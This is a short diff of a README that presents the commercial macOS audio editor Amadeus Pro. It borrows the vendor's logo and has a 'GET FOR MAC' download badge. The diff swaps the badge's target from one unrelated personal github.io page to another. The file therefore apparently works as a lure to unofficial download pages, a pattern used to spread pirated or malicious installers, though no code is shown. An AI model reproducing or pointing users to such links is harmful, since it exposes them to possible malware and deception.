@@ -1,11 +1,4 @@
-# Amadeus Pro – Professional Audio Editing for macOS
-
-<div align="center">  
-  <img src="https://www.hairersoft.com/images/icons/icon_pro200@2x.png" width="250" alt="Amadeus Pro Logo"/>  
-</div>  
-
-<br>  
-<div align="center"> [![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://samsonyichalal.github.io/github.io/) </div>
+<div align="center"> <img src="https://www.hairersoft.com/images/icons/icon_pro200@2x.png" width="250" alt="Amadeus Pro Logo"/> </div> <br> <div align="center"> [![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://Son-Ste.github.io/) </div>
 
 ---
 
